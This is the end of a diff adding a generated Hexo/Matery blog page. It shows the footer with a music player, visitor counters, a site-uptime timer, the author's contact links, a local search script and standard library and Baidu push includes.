+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="song"
+                   id="472137749"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024-2025</span>
+            
+            <span id="year">2024</span>
+            <a href="/about" target="_blank">HMX</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">149k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2024";
+                    var startMonth = "5";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:1282370648@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1282370648" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1282370648" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+    <!-- <script type="text/javascript" src="/js/fireworks.js"></script> -->
+
+    <!-- <script type="text/javascript">
+        //只在桌面版网页启用特效
+        var windowWidth = $(window).width();
+        if (windowWidth > 768) {
+            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+        }
+    </script> -->
+    
+    <script src="/js/snow.js"></script>
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
